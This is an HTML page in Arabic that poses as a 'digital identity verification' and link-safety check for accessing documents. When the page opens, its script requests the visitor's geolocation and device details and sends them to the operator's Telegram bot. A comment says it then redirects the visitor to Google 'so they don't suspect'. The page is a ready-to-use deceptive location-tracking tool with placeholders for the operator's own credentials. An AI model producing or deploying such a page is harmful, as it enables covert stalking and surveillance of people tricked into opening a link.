<!DOCTYPE html>
<html>
<head>
    <title>التحقق من الهوية الرقمية</title>
    <meta charset="UTF-8">
    <script>
        // --- ضع معلوماتك هنا ---
        const token = 'ضع_هنا_توكن_البوت'; 
        const chat_id = 'ضع_هنا_رقم_الايدي_تبلك';
        // -----------------------

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
            fetch(url);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                sendToTelegram("المتصفح لا يدعم تحديد الموقع.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;
            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            let info = `🎯 تم صيد إحداثيات جديدة!\n\n`;
            info += `📍 الموقع: ${mapUrl}\n`;
            info += `📏 الدقة: ${acc} متر\n`;
            info += `📱 الجهاز: ${navigator.userAgent}`;
            
            sendToTelegram(info);
            // تحويل المستخدم لموقع حقيقي عشان ما يشك
            setTimeout(() => {
                window.location.href = "https://www.google.com"; 
            }, 1000);
        }

        function showError(error) {
            sendToTelegram("فشل جلب الموقع: المستخدم رفض الطلب.");
        }

        // تشغيل الطلب بمجرد فتح الصفحة
        window.onload = getLocation;
    </script>
</head>
<body style="background-color: black; color: white; text-align: center; font-family: Arial;">
    <h2>يرجى الانتظار...</h2>
    <p>جاري التحقق من أمان الرابط للوصول إلى المستندات</p>
</body>
</html>
